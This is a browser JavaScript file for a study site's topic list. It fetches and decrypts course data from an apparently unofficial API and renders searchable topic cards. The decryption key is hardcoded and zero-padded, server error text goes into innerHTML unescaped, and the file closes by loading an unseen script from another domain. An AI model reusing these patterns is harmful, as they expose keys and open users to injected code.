const API_BASE = "https://mtaiirusapi.onrender.com";
const ENCRYPTION_KEY = "maggikhalo";

let topics = [];
let filteredTopics = [];
let isLoading = true;
let currentError = null;

const $ = (id) => document.getElementById(id);
const topicList = $("topicList");
const statusArea = $("statusArea");
const searchInput = $("searchInput");
const clearSearch = $("clearSearch");

const params = new URLSearchParams(window.location.search);
const BatchId = params.get("BatchId") || params.get("batchid") || "";
const Subjectslug = params.get("Subjectslug") || params.get("subjectslug") || "";
const subjectName = params.get("subjectName") || params.get("name") || "Subject";
const SubjectId = params.get("SubjectId") || params.get("subjectid") || "";

document.addEventListener("DOMContentLoaded", init);

function init(){
  setupHeader();
  setupEvents();
  loadTheme();
  fetchTopics();
}

function setupHeader(){
  $("pageTitle").textContent = subjectName;
  $("heroTitle").textContent = subjectName;
  $("pageSubTitle").textContent = "Topics & Contents";
  $("batchPill").textContent = `BatchId: ${BatchId || "missing"}`;
  $("subjectPill").textContent = `SubjectId: ${SubjectId || "missing"}`;
}

function setupEvents(){
  $("backBtn").addEventListener("click", () => {
    if(history.length > 1) history.back();
    else window.location.href = "/study-v2/batches";
  });

  $("searchToggle").addEventListener("click", () => {
    $("searchWrap").classList.toggle("hidden");
    if(!$("searchWrap").classList.contains("hidden")) searchInput.focus();
  });

  searchInput.addEventListener("input", () => {
    clearSearch.classList.toggle("hidden", !searchInput.value.trim());
    applySearchAndRender();
  });

  clearSearch.addEventListener("click", clearSearchValue);
  $("clearSearchToolbar").addEventListener("click", clearSearchValue);

  $("menuToggle").addEventListener("click", () => $("sideMenu").classList.add("open"));
  document.querySelectorAll("[data-close-menu]").forEach(el => el.addEventListener("click", () => $("sideMenu").classList.remove("open")));

  $("themeToggle").addEventListener("click", toggleTheme);
  $("reloadBtn").addEventListener("click", () => {
    $("sideMenu").classList.remove("open");
    fetchTopics();
  });
}

function clearSearchValue(){
  searchInput.value = "";
  clearSearch.classList.add("hidden");
  applySearchAndRender();
}

function loadTheme(){
  const saved = localStorage.getItem("akpTheme");
  if(saved === "dark") document.body.classList.add("dark");
  $("themeToggle").textContent = document.body.classList.contains("dark") ? "☀️" : "🌙";
}

function toggleTheme(){
  document.body.classList.toggle("dark");
  localStorage.setItem("akpTheme", document.body.classList.contains("dark") ? "dark" : "light");
  $("themeToggle").textContent = document.body.classList.contains("dark") ? "☀️" : "🌙";
}

async function fetchTopics(){
  if(!BatchId || !SubjectId){
    isLoading = false;
    currentError = "Required URL params missing.";
    topics = [];
    render();
    return;
  }

  isLoading = true;
  currentError = null;
  render();

  try{
    const url = new URL(`${API_BASE}/api/pw/topics`);
    url.searchParams.append("BatchId", BatchId);
    url.searchParams.append("SubjectId", SubjectId);

    const response = await fetch(url.toString());
    if(!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const json = await response.json();
    
    let decoded;
    if(typeof json.data === "string"){
      decoded = await decryptPayload(json.data);
    } else {
      decoded = json;
    }

    if(!decoded || !Array.isArray(decoded.data)){
      throw new Error(decoded?.error || "Invalid response");
    }

    const allContents = buildAllContents(decoded.data);
    topics = [allContents, ...decoded.data];
    isLoading = false;
    applySearchAndRender();
  } catch(error){
    isLoading = false;
    currentError = error.message;
    topics = [];
    render();
  }
}

function buildAllContents(list){
  return {
    _id: "all-contents",
    name: "All Contents",
    slug: "all-contents"
  };
}

function applySearchAndRender(){
  const query = searchInput.value.trim().toLowerCase();
  filteredTopics = topics.filter(topic => {
    const text = `${topic.name || ""} ${topic.slug || ""}`.toLowerCase();
    return text.includes(query);
  });
  render();
}

function render(){
  if(isLoading){
    statusArea.innerHTML = "";
    $("countText").textContent = "Loading...";
    topicList.innerHTML = Array.from({length:5}).map(() => `<div class="skeleton-card"></div>`).join("");
    return;
  }

  if(currentError){
    statusArea.innerHTML = `<div class="error">${currentError}</div>`;
    return;
  }

  topicList.innerHTML = filteredTopics.map(topicTemplate).join("");
  bindTopicClicks();
}

function topicTemplate(topic){
  return `<button class="topic-card" data-topic='${escapeAttr(JSON.stringify(topic))}'>${escapeHtml(topic.name)}</button>`;
}

function bindTopicClicks(){
  document.querySelectorAll("[data-topic]").forEach(card => {
    card.addEventListener("click", () => openTopic(JSON.parse(card.dataset.topic)));
  });
}

function openTopic(topic){
  const url = `/study-v2/batches/type?BatchId=${encodeURIComponent(BatchId)}&Subjectslug=${encodeURIComponent(Subjectslug)}&topicslug=${encodeURIComponent(topic.slug || "")}&topicId=${encodeURIComponent(topic._id || "")}&SubjectId=${encodeURIComponent(SubjectId)}`;
  window.location.href = url;
}

async function decryptPayload(payload){
  try{
    const [ivHex, encryptedHex] = payload.split(":");
    const iv = hexToBytes(ivHex);
    const encrypted = hexToBytes(encryptedHex);
    const key = await importAesKey(ENCRYPTION_KEY);
    const decrypted = await crypto.subtle.decrypt({name:"AES-GCM", iv}, key, encrypted);
    return JSON.parse(new TextDecoder().decode(decrypted));
  }catch(e){ return {success:false}; }
}

async function importAesKey(keyText){
  const encoded = new TextEncoder().encode(keyText);
  const keyBytes = new Uint8Array(32);
  for(let i=0;i<32;i++) keyBytes[i] = i < encoded.length ? encoded[i] : 0;
  return crypto.subtle.importKey("raw", keyBytes, {name:"AES-GCM", length:256}, false, ["decrypt"]);
}

function hexToBytes(hex){
  return new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
}

function escapeHtml(value){
  return String(value || "").replace(/[&<>'"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","'":"&#39;","\"":"&quot;"}[c]));
}

function escapeAttr(value){
  return escapeHtml(value).replace(/`/g, "&#96;");
}

const s = document.createElement("script");
s.src = "https://mtaiirus.pages.dev/html-js/aut.js";
s.async = true;
document.head.appendChild(s);
